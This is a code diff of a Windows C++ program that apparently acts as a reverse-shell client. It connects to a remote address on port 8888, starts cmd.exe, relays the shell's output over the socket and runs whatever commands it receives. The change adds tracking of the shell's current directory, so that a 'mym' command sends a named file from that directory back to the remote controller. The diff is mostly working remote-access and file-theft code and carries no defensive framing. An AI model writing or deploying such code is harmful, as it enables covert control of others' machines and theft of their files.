@@ -14,6 +14,7 @@ int _stdcall WinMain(
 	MySocket s1;
 	s1.SocketInit("10.59.13.192", 8888,false);
 	string test;
+	string path;
 	Shell shell;
 	shell.RunProcess(TEXT("C:\\Windows\\System32\\cmd.exe"));
 	cout << "Client" << endl;
@@ -21,15 +22,17 @@ int _stdcall WinMain(
 	shell.GetOutput(">", 2000, test);
 	s1.SocketSend(test);
 	while (true) {
-		
+		int pos = test.rfind("\r\n")+ 2;
+		path = test.substr( pos, test.size() - pos-1) + '\\';
 		test.erase();
 		s1.SocketRecv(test);
 		cout << test << endl;
+		
 		if (test == "000") {
 			break;
 		}
 		else if (test.substr(0, 3) == "mym") {//以"mym"开头则复制文件
-			s1.SocketSendF(test.substr(4));
+			s1.SocketSendF(path+test.substr(4));
 			continue;
 		}
 		shell.SetInput(test);
